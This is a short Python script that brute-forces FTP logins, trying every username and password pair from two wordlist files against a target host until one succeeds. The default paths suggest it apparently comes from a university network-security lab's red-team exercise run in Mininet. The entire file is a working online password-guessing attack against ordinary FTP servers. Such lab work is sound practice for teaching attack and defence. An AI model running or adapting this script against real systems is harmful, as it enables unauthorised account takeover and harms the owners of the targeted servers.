from ftplib import FTP, error_perm
import argparse


def try_ftp(ip, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(ip, port, timeout=5)
        ftp.login(username, password)
        print(f"Success: {username}:{password} on {ip}:{port}")
        ftp.quit()
        return True
    except error_perm:
        print(f"Failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", default="10.12.0.40")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--users", default="/home/mininet/LINFO2347/repo/red/bf/users.txt")
    parser.add_argument(
        "--passwords", default="/home/mininet/LINFO2347/repo/red/bf/passwords.txt"
    )
    args = parser.parse_args()

    with open(args.users, "r") as f:
        usernames = [line.strip() for line in f]
    with open(args.passwords, "r") as f:
        passwords = [line.strip() for line in f]

    found = False
    for username in usernames:
        for password in passwords:
            if try_ftp(args.ip, args.port, username, password):
                found = True
                break
        if found:
            break


if __name__ == "__main__":
    main()
